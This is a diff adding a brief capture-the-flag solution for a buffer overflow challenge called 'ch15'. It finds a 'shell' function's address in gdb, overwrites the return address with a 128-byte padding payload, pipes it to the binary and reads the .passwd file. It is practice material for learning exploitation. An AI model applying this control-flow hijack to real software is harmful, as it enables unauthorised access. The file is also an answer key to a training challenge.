@@ -1,0 +1,13 @@
+gdb ch15
+info function shell
+(Exemple Output: 0x08048464	shell)
+quit
+
+->We need to swap the bytes or the shell address in the python script.
+
+python -c 'print("A"*128 + "\x64\x84\x04\x08")' > /tmp/gbourgeo2
+cat /tmp/gbourgeo2 - | ./ch15
+cat .passwd
+
+DONE!
+
